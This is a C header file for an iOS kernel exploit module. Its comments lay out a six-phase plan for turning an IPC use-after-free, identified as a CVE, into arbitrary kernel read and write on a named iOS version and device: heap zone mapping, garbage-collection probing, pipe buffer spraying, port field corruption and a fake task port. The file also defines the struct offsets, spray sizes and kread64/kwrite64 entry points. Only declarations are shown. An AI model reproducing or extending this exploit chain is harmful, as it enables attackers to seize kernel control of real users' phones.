// ipc_escalate.h — IPC UAF → Arbitrary kwrite64 escalation
//
// The IPC UAF (CVE-2026-112474) gives us a confused port at a known kaddr
// with ip_context echo (mach_port_set/get_context to ONE fixed address).
// This module escalates that into arbitrary kwrite64 by:
//
//   Phase 1: Zone Layout Mapping via mach_port_space_info
//   Phase 2: Zone GC Probe — free entire ipc.ports pages, monitor reclamation
//   Phase 3: Pipe Buffer Overlay — spray kalloc pipes into freed zone pages
//   Phase 4: Port Field Manipulation — modify ip_kobject/io_bits via pipe r/w
//   Phase 5: Fake Task Port → pid_for_task kread → arbitrary kread64
//   Phase 6: Wire kwrite64 from pipe overlay + kread64 from fake task port
//
// If pipe overlay fails (zone GC blocked on SPTM), reports detailed zone
// diagnostics for the next iteration.
//
// Target: iOS 27.0.1 (d94ap / A18 Pro / SPTM)
#ifndef IPC_ESCALATE_H
#define IPC_ESCALATE_H

#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>

#define ESC_PROBE_PORTS      4096
#define ESC_GC_FREE_PAGES    32
#define ESC_PIPE_SPRAY       512
#define ESC_PIPE_BUF_SIZE    4096
#define ESC_MAX_PAGES        512

#define ESC_PORT_IP_CONTEXT_OFF  0x78
#define ESC_PORT_IO_BITS_OFF     0x00
#define ESC_PORT_IP_KOBJECT_OFF  0x40

typedef void (*escalate_log_fn)(const char *msg);

typedef struct {
    uint32_t element_size;
    uint32_t elements_per_page;
    uint32_t pages_mapped;
    uint64_t zone_base;
    uint64_t zone_end;
    uint64_t page_addrs[ESC_MAX_PAGES];
    uint32_t ports_per_page[ESC_MAX_PAGES];
    bool     kaddrs_reliable;
} esc_zone_info_t;

typedef struct {
    bool     gc_detected;
    uint32_t pages_freed;
    uint32_t pages_reclaimed_by_ports;
    uint32_t kaddr_shifts;
} esc_gc_info_t;

typedef struct {
    bool     overlap_found;
    int      pipe_idx;
    uint64_t overlap_kaddr;
    uint32_t overlap_offset;
    uint8_t  port_snapshot[256];
} esc_pipe_info_t;

typedef struct {
    // Zone probe
    esc_zone_info_t zone;

    // GC probe
    esc_gc_info_t gc;

    // Pipe overlay
    esc_pipe_info_t pipe;

    // Escalation result
    bool kwrite_works;
    bool kread_works;
    uint64_t test_read_addr;
    uint64_t test_read_value;

    // Confused port diagnostics
    bool port_active;
    bool ip_context_works;

    // Sysctl probe
    bool hostname_writable;
    bool hostname_readable;
    int  hostname_len;
} escalate_result_t;

void escalate_set_log(escalate_log_fn fn);
void escalate_set_kaslr(uint64_t slide);
void escalate_set_confused_port(mach_port_t port, uint64_t kaddr);

escalate_result_t escalate_run(void);

uint64_t escalate_kread64(uint64_t addr);
bool escalate_kwrite64(uint64_t addr, uint64_t val);

esc_zone_info_t escalate_probe_zone(void);
esc_gc_info_t escalate_probe_gc(esc_zone_info_t *zone);

#endif
